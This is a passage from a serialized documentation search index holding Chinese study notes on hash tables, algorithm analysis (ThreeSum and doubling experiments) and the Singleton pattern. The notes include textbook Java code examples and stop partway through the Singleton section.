Java \u4E2D\u7684 hashCode() \u5B9E\u73B0\u4E86\u54C8\u5E0C\u51FD\u6570\uFF0C\u4F46\u662F\u9ED8\u8BA4\u4F7F\u7528\u5BF9\u8C61\u7684\u5185\u5B58\u5730\u5740\u503C\u3002\u5728\u4F7F\u7528 hashCode() \u65F6\uFF0C\u5E94\u5F53\u7ED3\u5408\u9664\u7559\u4F59\u6570\u6CD5\u6765\u4F7F\u7528\u3002\u56E0\u4E3A\u5185\u5B58\u5730\u5740\u662F 32 \u4F4D\u6574\u6570\uFF0C\u6211\u4EEC\u53EA\u9700\u8981 31 \u4F4D\u7684\u975E\u8D1F\u6574\u6570\uFF0C\u56E0\u6B64\u5E94\u5F53\u5C4F\u853D\u7B26\u53F7\u4F4D\u4E4B\u540E\u518D\u4F7F\u7528\u9664\u7559\u4F59\u6570\u6CD5\u3002
int hash = (x.hashCode() & 0x7fffffff) % M;
\u4F7F\u7528 Java \u7684 HashMap \u7B49\u81EA\u5E26\u7684\u54C8\u5E0C\u8868\u5B9E\u73B0\u65F6\uFF0C\u53EA\u9700\u8981\u53BB\u5B9E\u73B0 Key \u7C7B\u578B\u7684 hashCode() \u51FD\u6570\u5373\u53EF\u3002Java \u89C4\u5B9A hashCode() \u80FD\u591F\u5C06\u952E\u5747\u5300\u5206\u5E03\u4E8E\u6240\u6709\u7684 32 \u4F4D\u6574\u6570\uFF0CJava \u4E2D\u7684 String\u3001Integer \u7B49\u5BF9\u8C61\u7684 hashCode() \u90FD\u80FD\u5B9E\u73B0\u8FD9\u4E00\u70B9\u3002\u4EE5\u4E0B\u5C55\u793A\u4E86\u81EA\u5B9A\u4E49\u7C7B\u578B\u5982\u4F55\u5B9E\u73B0 hashCode()\uFF1A
public class Transaction { private final String who; private final Date when; private final double amount; public Transaction(String who, Date when, double amount) { this.who = who; this.when = when; this.amount = amount; } public int hashCode() { int hash = 17; int R = 31; hash = R * hash + who.hashCode(); hash = R * hash + when.hashCode(); hash = R * hash + ((Double) amount).hashCode(); return hash; }
}`},{header:"2. \u62C9\u94FE\u6CD5",slug:"_2-\u62C9\u94FE\u6CD5",content:`\u62C9\u94FE\u6CD5\u4F7F\u7528\u94FE\u8868\u6765\u5B58\u50A8 hash \u503C\u76F8\u540C\u7684\u952E\uFF0C\u4ECE\u800C\u89E3\u51B3\u51B2\u7A81\u3002
\u67E5\u627E\u9700\u8981\u5206\u4E24\u6B65\uFF0C\u9996\u5148\u67E5\u627E Key \u6240\u5728\u7684\u94FE\u8868\uFF0C\u7136\u540E\u5728\u94FE\u8868\u4E2D\u987A\u5E8F\u67E5\u627E\u3002
\u5BF9\u4E8E N \u4E2A\u952E\uFF0CM \u6761\u94FE\u8868 (N>M)\uFF0C\u5982\u679C\u54C8\u5E0C\u51FD\u6570\u80FD\u591F\u6EE1\u8DB3\u5747\u5300\u6027\u7684\u6761\u4EF6\uFF0C\u6BCF\u6761\u94FE\u8868\u7684\u5927\u5C0F\u8D8B\u5411\u4E8E N/M\uFF0C\u56E0\u6B64\u672A\u547D\u4E2D\u7684\u67E5\u627E\u548C\u63D2\u5165\u64CD\u4F5C\u6240\u9700\u8981\u7684\u6BD4\u8F83\u6B21\u6570\u4E3A ~N/M\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/cbbfe06c-f0cb-47c4-bf7b-2780aebd98b2.png" width="330px">`},{header:"3. \u7EBF\u6027\u63A2\u6D4B\u6CD5",slug:"_3-\u7EBF\u6027\u63A2\u6D4B\u6CD5",content:`\u7EBF\u6027\u63A2\u6D4B\u6CD5\u4F7F\u7528\u7A7A\u4F4D\u6765\u89E3\u51B3\u51B2\u7A81\uFF0C\u5F53\u51B2\u7A81\u53D1\u751F\u65F6\uFF0C\u5411\u524D\u63A2\u6D4B\u4E00\u4E2A\u7A7A\u4F4D\u6765\u5B58\u50A8\u51B2\u7A81\u7684\u952E\u3002
\u4F7F\u7528\u7EBF\u6027\u63A2\u6D4B\u6CD5\uFF0C\u6570\u7EC4\u7684\u5927\u5C0F M \u5E94\u5F53\u5927\u4E8E\u952E\u7684\u4E2A\u6570 N\uFF08M>N)\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/0dbc4f7d-05c9-4aae-8065-7b7ea7e9709e.gif" width="350px">
public class LinearProbingHashST<Key, Value> implements UnorderedST<Key, Value> { private int N = 0; private int M = 16; private Key[] keys; private Value[] values; public LinearProbingHashST() { init(); } public LinearProbingHashST(int M) { this.M = M; init(); } private void init() { keys = (Key[]) new Object[M]; values = (Value[]) new Object[M]; } private int hash(Key key) { return (key.hashCode() & 0x7fffffff) % M; }
}`},{header:"3.1 \u67E5\u627E",slug:"_3-1-\u67E5\u627E",content:`public Value get(Key key) { for (int i = hash(key); keys[i] != null; i = (i + 1) % M) if (keys[i].equals(key)) return values[i]; return null;
}`},{header:"3.2 \u63D2\u5165",slug:"_3-2-\u63D2\u5165",content:`public void put(Key key, Value value) { resize(); putInternal(key, value);
} private void putInternal(Key key, Value value) { int i; for (i = hash(key); keys[i] != null; i = (i + 1) % M) if (keys[i].equals(key)) { values[i] = value; return; } keys[i] = key; values[i] = value; N++;
}`},{header:"3.3 \u5220\u9664",slug:"_3-3-\u5220\u9664",content:`\u5220\u9664\u64CD\u4F5C\u5E94\u5F53\u5C06\u53F3\u4FA7\u6240\u6709\u76F8\u90BB\u7684\u952E\u503C\u5BF9\u91CD\u65B0\u63D2\u5165\u6563\u5217\u8868\u4E2D\u3002
public void delete(Key key) { int i = hash(key); while (keys[i] != null && !key.equals(keys[i])) i = (i + 1) % M; // \u4E0D\u5B58\u5728\uFF0C\u76F4\u63A5\u8FD4\u56DE if (keys[i] == null) return; keys[i] = null; values[i] = null; // \u5C06\u4E4B\u540E\u76F8\u8FDE\u7684\u952E\u503C\u5BF9\u91CD\u65B0\u63D2\u5165 i = (i + 1) % M; while (keys[i] != null) { Key keyToRedo = keys[i]; Value valToRedo = values[i]; keys[i] = null; values[i] = null; N--; putInternal(keyToRedo, valToRedo); i = (i + 1) % M; } N--; resize();
}`},{header:"3.5 \u8C03\u6574\u6570\u7EC4\u5927\u5C0F",slug:"_3-5-\u8C03\u6574\u6570\u7EC4\u5927\u5C0F",content:`\u7EBF\u6027\u63A2\u6D4B\u6CD5\u7684\u6210\u672C\u53D6\u51B3\u4E8E\u8FDE\u7EED\u6761\u76EE\u7684\u957F\u5EA6\uFF0C\u8FDE\u7EED\u6761\u76EE\u4E5F\u53EB\u805A\u7C07\u3002\u5F53\u805A\u7C07\u5F88\u957F\u65F6\uFF0C\u5728\u67E5\u627E\u548C\u63D2\u5165\u65F6\u4E5F\u9700\u8981\u8FDB\u884C\u5F88\u591A\u6B21\u63A2\u6D4B\u3002\u4F8B\u5982\u4E0B\u56FE\u4E2D 2~4 \u4F4D\u7F6E\u5C31\u662F\u4E00\u4E2A\u805A\u7C07\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ace20410-f053-4c4a-aca4-2c603ff11bbe.png" width="340px">
\u03B1 = N/M\uFF0C\u628A \u03B1 \u79F0\u4E3A\u4F7F\u7528\u7387\u3002\u7406\u8BBA\u8BC1\u660E\uFF0C\u5F53 \u03B1 \u5C0F\u4E8E 1/2 \u65F6\u63A2\u6D4B\u7684\u9884\u8BA1\u6B21\u6570\u53EA\u5728 1.5 \u5230 2.5 \u4E4B\u95F4\u3002\u4E3A\u4E86\u4FDD\u8BC1\u6563\u5217\u8868\u7684\u6027\u80FD\uFF0C\u5E94\u5F53\u8C03\u6574\u6570\u7EC4\u7684\u5927\u5C0F\uFF0C\u4F7F\u5F97 \u03B1 \u5728 [1/4, 1/2] \u4E4B\u95F4\u3002
private void resize() { if (N >= M / 2) resize(2 * M); else if (N <= M / 8) resize(M / 2);
} private void resize(int cap) { LinearProbingHashST<Key, Value> t = new LinearProbingHashST<Key, Value>(cap); for (int i = 0; i < M; i++) if (keys[i] != null) t.putInternal(keys[i], values[i]); keys = t.keys; values = t.values; M = t.M;
}`},{header:"\u5C0F\u7ED3",slug:"\u5C0F\u7ED3",content:""},{header:"1. \u7B26\u53F7\u8868\u7B97\u6CD5\u6BD4\u8F83",slug:"_1-\u7B26\u53F7\u8868\u7B97\u6CD5\u6BD4\u8F83",content:`\u7B97\u6CD5
\u63D2\u5165
\u67E5\u627E
\u662F\u5426\u6709\u5E8F \u94FE\u8868\u5B9E\u73B0\u7684\u65E0\u5E8F\u7B26\u53F7\u8868
N
N
yes \u4E8C\u5206\u67E5\u627E\u5B9E\u73B0\u7684\u6709\u5E8F\u7B26\u53F7\u8868
N
logN
yes \u4E8C\u53C9\u67E5\u627E\u6811
logN
logN
yes 2-3 \u67E5\u627E\u6811
logN
logN
yes \u62C9\u94FE\u6CD5\u5B9E\u73B0\u7684\u6563\u5217\u8868
N/M
N/M
no \u7EBF\u6027\u63A2\u6D4B\u6CD5\u5B9E\u73B0\u7684\u6563\u5217\u8868
1
1
no \u5E94\u5F53\u4F18\u5148\u8003\u8651\u6563\u5217\u8868\uFF0C\u5F53\u9700\u8981\u6709\u5E8F\u6027\u64CD\u4F5C\u65F6\u4F7F\u7528\u7EA2\u9ED1\u6811\u3002`},{header:"2. Java \u7684\u7B26\u53F7\u8868\u5B9E\u73B0",slug:"_2-java-\u7684\u7B26\u53F7\u8868\u5B9E\u73B0",content:`java.util.TreeMap\uFF1A\u7EA2\u9ED1\u6811
java.util.HashMap\uFF1A\u62C9\u94FE\u6CD5\u7684\u6563\u5217\u8868`},{header:"3. \u7A00\u758F\u5411\u91CF\u4E58\u6CD5",slug:"_3-\u7A00\u758F\u5411\u91CF\u4E58\u6CD5",content:`\u5F53\u5411\u91CF\u4E3A\u7A00\u758F\u5411\u91CF\u65F6\uFF0C\u53EF\u4EE5\u4F7F\u7528\u7B26\u53F7\u8868\u6765\u5B58\u50A8\u5411\u91CF\u4E2D\u7684\u975E 0 \u7D22\u5F15\u548C\u503C\uFF0C\u4F7F\u5F97\u4E58\u6CD5\u8FD0\u7B97\u53EA\u9700\u8981\u5BF9\u90A3\u4E9B\u975E 0 \u5143\u7D20\u8FDB\u884C\u5373\u53EF\u3002
public class SparseVector { private HashMap<Integer, Double> hashMap; public SparseVector(double[] vector) { hashMap = new HashMap<>(); for (int i = 0; i < vector.length; i++) if (vector[i] != 0) hashMap.put(i, vector[i]); } public double get(int i) { return hashMap.getOrDefault(i, 0.0); } public double dot(SparseVector other) { double sum = 0; for (int i : hashMap.keySet()) sum += this.get(i) * other.get(i); return sum; }
}`}]},{path:"/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95%20-%20%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90.html",title:"\u7B97\u6CD5 - \u7B97\u6CD5\u5206\u6790",pathLocale:"/",contents:[{header:"\u7B97\u6CD5 - \u7B97\u6CD5\u5206\u6790",slug:"\u7B97\u6CD5-\u7B97\u6CD5\u5206\u6790",content:`\u7B97\u6CD5 - \u7B97\u6CD5\u5206\u6790 \u6570\u5B66\u6A21\u578B 1. \u8FD1\u4F3C
2. \u589E\u957F\u6570\u91CF\u7EA7
3. \u5185\u5FAA\u73AF
4. \u6210\u672C\u6A21\u578B \u6CE8\u610F\u4E8B\u9879 1. \u5927\u5E38\u6570
2. \u7F13\u5B58
3. \u5BF9\u6700\u574F\u60C5\u51B5\u4E0B\u7684\u6027\u80FD\u7684\u4FDD\u8BC1
4. \u968F\u673A\u5316\u7B97\u6CD5
5. \u5747\u644A\u5206\u6790 ThreeSum 1. ThreeSumSlow
2. ThreeSumBinarySearch
3. ThreeSumTwoPointer \u500D\u7387\u5B9E\u9A8C`},{header:"\u6570\u5B66\u6A21\u578B",slug:"\u6570\u5B66\u6A21\u578B",content:""},{header:"1. \u8FD1\u4F3C",slug:"_1-\u8FD1\u4F3C",content:"N3/6-N2/2+N/3 ~ N3/6\u3002\u4F7F\u7528 ~f(N) \u6765\u8868\u793A\u6240\u6709\u968F\u7740 N \u7684\u589E\u5927\u9664\u4EE5 f(N) \u7684\u7ED3\u679C\u8D8B\u8FD1\u4E8E 1 \u7684\u51FD\u6570\u3002"},{header:"2. \u589E\u957F\u6570\u91CF\u7EA7",slug:"_2-\u589E\u957F\u6570\u91CF\u7EA7",content:"N3/6-N2/2+N/3 \u7684\u589E\u957F\u6570\u91CF\u7EA7\u4E3A O(N3)\u3002\u589E\u957F\u6570\u91CF\u7EA7\u5C06\u7B97\u6CD5\u4E0E\u5B83\u7684\u5177\u4F53\u5B9E\u73B0\u9694\u79BB\u5F00\u6765\uFF0C\u4E00\u4E2A\u7B97\u6CD5\u7684\u589E\u957F\u6570\u91CF\u7EA7\u4E3A O(N3) \u4E0E\u5B83\u662F\u5426\u7528 Java \u5B9E\u73B0\uFF0C\u662F\u5426\u8FD0\u884C\u4E8E\u7279\u5B9A\u8BA1\u7B97\u673A\u4E0A\u65E0\u5173\u3002"},{header:"3. \u5185\u5FAA\u73AF",slug:"_3-\u5185\u5FAA\u73AF",content:"\u6267\u884C\u6700\u9891\u7E41\u7684\u6307\u4EE4\u51B3\u5B9A\u4E86\u7A0B\u5E8F\u6267\u884C\u7684\u603B\u65F6\u95F4\uFF0C\u628A\u8FD9\u4E9B\u6307\u4EE4\u79F0\u4E3A\u7A0B\u5E8F\u7684\u5185\u5FAA\u73AF\u3002"},{header:"4. \u6210\u672C\u6A21\u578B",slug:"_4-\u6210\u672C\u6A21\u578B",content:"\u4F7F\u7528\u6210\u672C\u6A21\u578B\u6765\u8BC4\u4F30\u7B97\u6CD5\uFF0C\u4F8B\u5982\u6570\u7EC4\u7684\u8BBF\u95EE\u6B21\u6570\u5C31\u662F\u4E00\u79CD\u6210\u672C\u6A21\u578B\u3002"},{header:"\u6CE8\u610F\u4E8B\u9879",slug:"\u6CE8\u610F\u4E8B\u9879",content:""},{header:"1. \u5927\u5E38\u6570",slug:"_1-\u5927\u5E38\u6570",content:"\u5728\u6C42\u8FD1\u4F3C\u65F6\uFF0C\u5982\u679C\u4F4E\u7EA7\u9879\u7684\u5E38\u6570\u7CFB\u6570\u5F88\u5927\uFF0C\u90A3\u4E48\u8FD1\u4F3C\u7684\u7ED3\u679C\u662F\u9519\u8BEF\u7684\u3002"},{header:"2. \u7F13\u5B58",slug:"_2-\u7F13\u5B58",content:"\u8BA1\u7B97\u673A\u7CFB\u7EDF\u4F1A\u4F7F\u7528\u7F13\u5B58\u6280\u672F\u6765\u7EC4\u7EC7\u5185\u5B58\uFF0C\u8BBF\u95EE\u6570\u7EC4\u76F8\u90BB\u7684\u5143\u7D20\u4F1A\u6BD4\u8BBF\u95EE\u4E0D\u76F8\u90BB\u7684\u5143\u7D20\u5FEB\u5F88\u591A\u3002"},{header:"3. \u5BF9\u6700\u574F\u60C5\u51B5\u4E0B\u7684\u6027\u80FD\u7684\u4FDD\u8BC1",slug:"_3-\u5BF9\u6700\u574F\u60C5\u51B5\u4E0B\u7684\u6027\u80FD\u7684\u4FDD\u8BC1",content:"\u5728\u6838\u53CD\u5E94\u5806\u3001\u5FC3\u810F\u8D77\u640F\u5668\u6216\u8005\u5239\u8F66\u63A7\u5236\u5668\u4E2D\u7684\u8F6F\u4EF6\uFF0C\u6700\u574F\u60C5\u51B5\u4E0B\u7684\u6027\u80FD\u662F\u5341\u5206\u91CD\u8981\u7684\u3002"},{header:"4. \u968F\u673A\u5316\u7B97\u6CD5",slug:"_4-\u968F\u673A\u5316\u7B97\u6CD5",content:"\u901A\u8FC7\u6253\u4E71\u8F93\u5165\uFF0C\u53BB\u9664\u7B97\u6CD5\u5BF9\u8F93\u5165\u7684\u4F9D\u8D56\u3002"},{header:"5. \u5747\u644A\u5206\u6790",slug:"_5-\u5747\u644A\u5206\u6790",content:"\u5C06\u6240\u6709\u64CD\u4F5C\u7684\u603B\u6210\u672C\u9664\u4E8E\u64CD\u4F5C\u603B\u6570\u6765\u5C06\u6210\u672C\u5747\u644A\u3002\u4F8B\u5982\u5BF9\u4E00\u4E2A\u7A7A\u6808\u8FDB\u884C N \u6B21\u8FDE\u7EED\u7684 push() \u8C03\u7528\u9700\u8981\u8BBF\u95EE\u6570\u7EC4\u7684\u6B21\u6570\u4E3A N+4+8+16+...+2N=5N-4\uFF08N \u662F\u5411\u6570\u7EC4\u5199\u5165\u5143\u7D20\u7684\u6B21\u6570\uFF0C\u5176\u4F59\u90FD\u662F\u8C03\u6574\u6570\u7EC4\u5927\u5C0F\u65F6\u8FDB\u884C\u590D\u5236\u9700\u8981\u7684\u8BBF\u95EE\u6570\u7EC4\u6B21\u6570\uFF09\uFF0C\u5747\u644A\u540E\u8BBF\u95EE\u6570\u7EC4\u7684\u5E73\u5747\u6B21\u6570\u4E3A\u5E38\u6570\u3002"},{header:"ThreeSum",slug:"threesum",content:`ThreeSum \u7528\u4E8E\u7EDF\u8BA1\u4E00\u4E2A\u6570\u7EC4\u4E2D\u548C\u4E3A 0 \u7684\u4E09\u5143\u7EC4\u6570\u91CF\u3002
public interface ThreeSum { int count(int[] nums);
}`},{header:"1. ThreeSumSlow",slug:"_1-threesumslow",content:`\u8BE5\u7B97\u6CD5\u7684\u5185\u5FAA\u73AF\u4E3A if (nums[i] + nums[j] + nums[k] == 0) \u8BED\u53E5\uFF0C\u603B\u5171\u6267\u884C\u7684\u6B21\u6570\u4E3A N(N-1)(N-2) = N3/6-N2/2+N/3\uFF0C\u56E0\u6B64\u5B83\u7684\u8FD1\u4F3C\u6267\u884C\u6B21\u6570\u4E3A ~N3/6\uFF0C\u589E\u957F\u6570\u91CF\u7EA7\u4E3A O(N3)\u3002
public class ThreeSumSlow implements ThreeSum { @Override public int count(int[] nums) { int N = nums.length; int cnt = 0; for (int i = 0; i < N; i++) { for (int j = i + 1; j < N; j++) { for (int k = j + 1; k < N; k++) { if (nums[i] + nums[j] + nums[k] == 0) { cnt++; } } } } return cnt; }
}`},{header:"2. ThreeSumBinarySearch",slug:"_2-threesumbinarysearch",content:`\u5C06\u6570\u7EC4\u8FDB\u884C\u6392\u5E8F\uFF0C\u5BF9\u4E24\u4E2A\u5143\u7D20\u6C42\u548C\uFF0C\u5E76\u7528\u4E8C\u5206\u67E5\u627E\u65B9\u6CD5\u67E5\u627E\u662F\u5426\u5B58\u5728\u8BE5\u548C\u7684\u76F8\u53CD\u6570\uFF0C\u5982\u679C\u5B58\u5728\uFF0C\u5C31\u8BF4\u660E\u5B58\u5728\u548C\u4E3A 0 \u7684\u4E09\u5143\u7EC4\u3002
\u5E94\u8BE5\u6CE8\u610F\u7684\u662F\uFF0C\u53EA\u6709\u6570\u7EC4\u4E0D\u542B\u6709\u76F8\u540C\u5143\u7D20\u624D\u80FD\u4F7F\u7528\u8FD9\u79CD\u89E3\u6CD5\uFF0C\u5426\u5219\u4E8C\u5206\u67E5\u627E\u7684\u7ED3\u679C\u4F1A\u51FA\u9519\u3002
\u8BE5\u65B9\u6CD5\u53EF\u4EE5\u5C06 ThreeSum \u7B97\u6CD5\u589E\u957F\u6570\u91CF\u7EA7\u964D\u4F4E\u4E3A O(N2logN)\u3002
public class ThreeSumBinarySearch implements ThreeSum { @Override public int count(int[] nums) { Arrays.sort(nums); int N = nums.length; int cnt = 0; for (int i = 0; i < N; i++) { for (int j = i + 1; j < N; j++) { int target = -nums[i] - nums[j]; int index = BinarySearch.search(nums, target); // \u5E94\u8BE5\u6CE8\u610F\u8FD9\u91CC\u7684\u4E0B\u6807\u5FC5\u987B\u5927\u4E8E j\uFF0C\u5426\u5219\u4F1A\u91CD\u590D\u7EDF\u8BA1\u3002 if (index > j) { cnt++; } } } return cnt; }
}
public class BinarySearch { public static int search(int[] nums, int target) { int l = 0, h = nums.length - 1; while (l <= h) { int m = l + (h - l) / 2; if (target == nums[m]) { return m; } else if (target > nums[m]) { l = m + 1; } else { h = m - 1; } } return -1; }
}`},{header:"3. ThreeSumTwoPointer",slug:"_3-threesumtwopointer",content:`\u66F4\u6709\u6548\u7684\u65B9\u6CD5\u662F\u5148\u5C06\u6570\u7EC4\u6392\u5E8F\uFF0C\u7136\u540E\u4F7F\u7528\u53CC\u6307\u9488\u8FDB\u884C\u67E5\u627E\uFF0C\u65F6\u95F4\u590D\u6742\u5EA6\u4E3A O(N2)\u3002
\u540C\u6837\u4E0D\u9002\u7528\u4E0E\u6570\u7EC4\u5B58\u5728\u91CD\u590D\u5143\u7D20\u7684\u60C5\u51B5\u3002
public class ThreeSumTwoPointer implements ThreeSum { @Override public int count(int[] nums) { int N = nums.length; int cnt = 0; Arrays.sort(nums); for (int i = 0; i < N - 2; i++) { int l = i + 1, h = N - 1, target = -nums[i]; while (l < h) { int sum = nums[l] + nums[h]; if (sum == target) { cnt++; l++; h--; } else if (sum < target) { l++; } else { h--; } } } return cnt; }
}`},{header:"\u500D\u7387\u5B9E\u9A8C",slug:"\u500D\u7387\u5B9E\u9A8C",content:`\u5982\u679C T(N) ~ aNblogN\uFF0C\u90A3\u4E48 T(2N)/T(N) ~ 2b\u3002
\u4F8B\u5982\u5BF9\u4E8E\u66B4\u529B\u7684 ThreeSum \u7B97\u6CD5\uFF0C\u8FD1\u4F3C\u65F6\u95F4\u4E3A ~N3/6\u3002\u8FDB\u884C\u5982\u4E0B\u5B9E\u9A8C\uFF1A\u591A\u6B21\u8FD0\u884C\u8BE5\u7B97\u6CD5\uFF0C\u6BCF\u6B21\u53D6\u7684 N \u503C\u4E3A\u524D\u4E00\u6B21\u7684\u4E24\u500D\uFF0C\u7EDF\u8BA1\u6BCF\u6B21\u6267\u884C\u7684\u65F6\u95F4\uFF0C\u5E76\u7EDF\u8BA1\u672C\u6B21\u8FD0\u884C\u65F6\u95F4\u4E0E\u524D\u4E00\u6B21\u8FD0\u884C\u65F6\u95F4\u7684\u6BD4\u503C\uFF0C\u5F97\u5230\u5982\u4E0B\u7ED3\u679C\uFF1A N
Time(ms)
Ratio 500
48
/ 1000
320
6.7 2000
555
1.7 4000
4105
7.4 8000
33575
8.2 16000
268909
8.0 \u53EF\u4EE5\u770B\u5230\uFF0CT(2N)/T(N) ~ 23\uFF0C\u56E0\u6B64\u53EF\u4EE5\u786E\u5B9A T(N) ~ aN3logN\u3002
public class RatioTest { public static void main(String[] args) { int N = 500; int loopTimes = 7; double preTime = -1; while (loopTimes-- > 0) { int[] nums = new int[N]; StopWatch.start(); ThreeSum threeSum = new ThreeSumSlow(); int cnt = threeSum.count(nums); System.out.println(cnt); double elapsedTime = StopWatch.elapsedTime(); double ratio = preTime == -1 ? 0 : elapsedTime / preTime; System.out.println(N + " " + elapsedTime + " " + ratio); preTime = elapsedTime; N *= 2; } }
}
public class StopWatch { private static long start; public static void start() { start = System.currentTimeMillis(); } public static double elapsedTime() { long now = System.currentTimeMillis(); return (now - start) / 1000.0; }
}`}]},{path:"/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95.html",title:"",pathLocale:"/",contents:[{header:"",slug:"",content:"\u7B97\u6CD5"}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/",title:"\u8BBE\u8BA1\u6A21\u5F0F",pathLocale:"/",contents:[{header:"\u8BBE\u8BA1\u6A21\u5F0F",slug:"\u8BBE\u8BA1\u6A21\u5F0F",content:""}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20%20-%20%E5%8D%95%E4%BE%8B.html",title:"",pathLocale:"/",contents:[{header:"\u5355\u4F8B\uFF08Singleton\uFF09",slug:"\u5355\u4F8B-singleton",content:""},{header:"Intent",slug:"intent",content:"\u786E\u4FDD\u4E00\u4E2A\u7C7B\u53EA\u6709\u4E00\u4E2A\u5B9E\u4F8B\uFF0C\u5E76\u63D0\u4F9B\u8BE5\u5B9E\u4F8B\u7684\u5168\u5C40\u8BBF\u95EE\u70B9\u3002"},{header:"Class Diagram",slug:"class-diagram",content:`\u4F7F\u7528\u4E00\u4E2A\u79C1\u6709\u6784\u9020\u51FD\u6570\u3001\u4E00\u4E2A\u79C1\u6709\u9759\u6001\u53D8\u91CF\u4EE5\u53CA\u4E00\u4E2A\u516C\u6709\u9759\u6001\u51FD\u6570\u6765\u5B9E\u73B0\u3002
\u79C1\u6709\u6784\u9020\u51FD\u6570\u4FDD\u8BC1\u4E86\u4E0D\u80FD\u901A\u8FC7\u6784\u9020\u51FD\u6570\u6765\u521B\u5EFA\u5BF9\u8C61\u5B9E\u4F8B\uFF0C\u53EA\u80FD\u901A\u8FC7\u516C\u6709\u9759\u6001\u51FD\u6570\u8FD4\u56DE\u552F\u4E00\u7684\u79C1\u6709\u9759\u6001\u53D8\u91CF\u3002`},{header:"Implementation",slug:"implementation",content:""},{header:"\u2160 \u61D2\u6C49\u5F0F-\u7EBF\u7A0B\u4E0D\u5B89\u5168",slug:"i-\u61D2\u6C49\u5F0F-\u7EBF\u7A0B\u4E0D\u5B89\u5168",content:`\u4EE5\u4E0B\u5B9E\u73B0\u4E2D\uFF0C\u79C1\u6709\u9759\u6001\u53D8\u91CF uniqueInstance \u88AB\u5EF6\u8FDF\u5B9E\u4F8B\u5316\uFF0C\u8FD9\u6837\u505A\u7684\u597D\u5904\u662F\uFF0C\u5982\u679C\u6CA1\u6709\u7528\u5230\u8BE5\u7C7B\uFF0C\u90A3\u4E48\u5C31\u4E0D\u4F1A\u5B9E\u4F8B\u5316 uniqueInstance\uFF0C\u4ECE\u800C\u8282\u7EA6\u8D44\u6E90\u3002
\u8FD9\u4E2A\u5B9E\u73B0\u5728\u591A\u7EBF\u7A0B\u73AF\u5883\u4E0B\u662F\u4E0D\u5B89\u5168\u7684\uFF0C\u5982\u679C\u591A\u4E2A\u7EBF\u7A0B\u80FD\u591F\u540C\u65F6\u8FDB\u5165 if (uniqueInstance == null) \uFF0C\u5E76\u4E14\u6B64\u65F6 uniqueInstance \u4E3A null\uFF0C\u90A3\u4E48\u4F1A\u6709\u591A\u4E2A\u7EBF\u7A0B\u6267\u884C uniqueInstance = new Singleton(); \u8BED\u53E5\uFF0C\u8FD9\u5C06\u5BFC\u81F4\u5B9E\u4F8B\u5316\u591A\u6B21 uniqueInstance\u3002
public class Singleton { private static Singleton uniqueInstance; private Singleton() { } public static Singleton getUniqueInstance() { if (uniqueInstance == null) { uniqueInstance = new Singleton(); } return uniqueInstance; }
}`},{header:"\u2161 \u997F\u6C49\u5F0F-\u7EBF\u7A0B\u5B89\u5168",slug:"ii-\u997F\u6C49\u5F0F-\u7EBF\u7A0B\u5B89\u5168",content:`\u7EBF\u7A0B\u4E0D\u5B89\u5168\u95EE\u9898\u4E3B\u8981\u662F\u7531\u4E8E uniqueInstance \u88AB\u5B9E\u4F8B\u5316\u591A\u6B21\uFF0C\u91C7\u53D6\u76F4\u63A5\u5B9E\u4F8B\u5316 uniqueInstance \u7684\u65B9\u5F0F\u5C31\u4E0D\u4F1A\u4EA7\u751F\u7EBF\u7A0B\u4E0D\u5B89\u5168\u95EE\u9898\u3002
\u4F46\u662F\u76F4\u63A5\u5B9E\u4F8B\u5316\u7684\u65B9\u5F0F\u4E5F\u4E22\u5931\u4E86\u5EF6\u8FDF\u5B9E\u4F8B\u5316\u5E26\u6765\u7684\u8282\u7EA6\u8D44\u6E90\u7684\u597D\u5904\u3002
private static Singleton uniqueInstance = new Singleton();`},{header:"\u2162 \u61D2\u6C49\u5F0F-\u7EBF\u7A0B\u5B89\u5168",slug:"iii-\u61D2\u6C49\u5F0F-\u7EBF\u7A0B\u5B89\u5168",content:`\u53EA\u9700\u8981\u5BF9 getUniqueInstance() \u65B9\u6CD5\u52A0\u9501\uFF0C\u90A3\u4E48\u5728\u4E00\u4E2A\u65F6\u95F4\u70B9\u53EA\u80FD\u6709\u4E00\u4E2A\u7EBF\u7A0B\u80FD\u591F\u8FDB\u5165\u8BE5\u65B9\u6CD5\uFF0C\u4ECE\u800C\u907F\u514D\u4E86\u5B9E\u4F8B\u5316\u591A\u6B21 uniqueInstance\u3002
\u4F46\u662F\u5F53\u4E00\u4E2A\u7EBF\u7A0B\u8FDB\u5165\u8BE5\u65B9\u6CD5\u4E4B\u540E\uFF0C\u5176\u5B83\u8BD5\u56FE\u8FDB\u5165\u8BE5\u65B9\u6CD5\u7684\u7EBF\u7A0B\u90FD\u5FC5\u987B\u7B49\u5F85\uFF0C\u5373\u4F7F uniqueInstance \u5DF2\u7ECF\u88AB\u5B9E\u4F8B\u5316\u4E86\u3002\u8FD9\u4F1A\u8BA9\u7EBF\u7A0B\u963B\u585E\u65F6\u95F4\u8FC7\u957F\uFF0C\u56E0\u6B64\u8BE5\u65B9\u6CD5\u6709\u6027\u80FD\u95EE\u9898\uFF0C\u4E0D\u63A8\u8350\u4F7F\u7528\u3002
public static synchronized Singleton getUniqueInstance() { if (uniqueInstance == null) { uniqueInstance = new Singleton(); } return uniqueInstance;
}`},{header:"\u2163 \u53CC\u91CD\u6821\u9A8C\u9501-\u7EBF\u7A0B\u5B89\u5168",slug:"iv-\u53CC\u91CD\u6821\u9A8C\u9501-\u7EBF\u7A0B\u5B89\u5168",content:`uniqueInstance \u53EA\u9700\u8981\u88AB\u5B9E\u4F8B\u5316\u4E00\u6B21\uFF0C\u4E4B\u540E\u5C31\u53EF\u4EE5\u76F4\u63A5\u4F7F\u7528\u4E86\u3002\u52A0\u9501\u64CD\u4F5C\u53EA\u9700\u8981\u5BF9\u5B9E\u4F8B\u5316\u90A3\u90E8\u5206\u7684\u4EE3\u7801\u8FDB\u884C\uFF0C\u53EA\u6709\u5F53 uniqueInstance \u6CA1\u6709\u88AB\u5B9E\u4F8B\u5316\u65F6\uFF0C\u624D\u9700\u8981\u8FDB\u884C\u52A0\u9501\u3002
